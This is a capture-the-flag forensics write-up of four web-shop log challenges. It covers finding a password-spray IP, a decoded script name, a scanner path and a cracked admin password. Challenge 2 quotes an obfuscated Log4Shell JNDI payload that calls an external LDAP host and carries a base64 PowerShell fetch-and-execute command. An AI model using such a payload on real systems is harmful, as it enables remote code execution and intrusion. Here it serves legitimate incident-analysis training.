The shop challenges were by far my favourite and my first real experience to the world of DFIR.

The setup is to download a JSON file and install splunk. Instead of doing that I decided to write a basic python script to analyse the file as I didnt want to spend extra time learning new software. The script (at the time of the ctf) was very basic and showed the unique values of the entire file. The point was to then sort through this to find anything strange. After the ctf I cleaned it up and gave some basic cli UI to help people interact with it.

### Challenge 1. Shop-Knock Knock Knock

It talks about a bruteforce/password spray against the website.
From a biased offensive mindset this is normally done via a post request. So I opened the JSON file and CTRL+F loking for POST. The first hit was for this IP: 58.164.62.91, doing a whois shows that the ISP is Telstra and the email is abuse@telstra.net

### Challenge 2. Logging for what?

This time we need to find the name of the script that was run. I used the python script and dumped all the unique values over url and useragent I found an intresting b64 command.
```powershell
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://41.108.181.141:5552/Basic/Command/Base64/cG93ZXJzaGVsbC5leGUgLWV4ZWMgYnlwYXNzIC1DICJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZG93bnVuZGVyY3RmLmNvbS9wVENOcDVwNkxQMGQ3cUE3N3l2YjRTSGY0MCcpOyI=}
```
Passing it into cyberchef gives a downlaodstring of this url 'https://downunderctf.com/pTCNp5p6LP0d7qA77yvb4SHf40' meaning the script/flag is pTCNp5p6LP0d7qA77yvb4SHf40

### Challenge 3. I'm just looking

Need to find the name of a vulnerability scanning tool.
While looking over the url field for the challenge above I found a reference to nuclei.php shop.downunderctf.com/wp-content/uploads/simple-file-list/nuclei.php Which happens to be the flag.

### Challenge 4. Oi! Get out of there!

Need to find the old password for the admin.
While going over the output of url there is a ref parameter in base64. this decodes to a hash. Cracking all four hashes gives these four password:
Password1, ozzieozzieozzie, downunder2 and crackstation. Trying these gives ozzieozzieozzie to be the correct flag.